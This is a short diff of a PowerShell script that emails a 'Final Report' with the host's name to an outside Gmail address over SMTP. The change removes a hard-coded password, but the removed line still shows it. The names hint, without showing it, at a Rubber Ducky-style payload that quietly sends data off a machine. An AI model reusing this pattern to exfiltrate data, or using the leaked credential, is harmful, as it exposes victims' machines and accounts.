@@ -217,7 +217,7 @@ function Old-Guard {
                             #email results
                             $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587)
                             $SMTPInfo.EnableSsl = $true
-                            $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('logsandstuff12', 'usedrubberducky')
+                            $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('logsandstuff12', '')
                             $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'logsandstuff12@gmail.com' 
                             $ReportEmail.To.Add('warof1846@gmail.com')
                             $ReportEmail.Subject = 'Final Report - ' +[System.Net.Dns]::GetHostByName(($env:computerName)).HostName
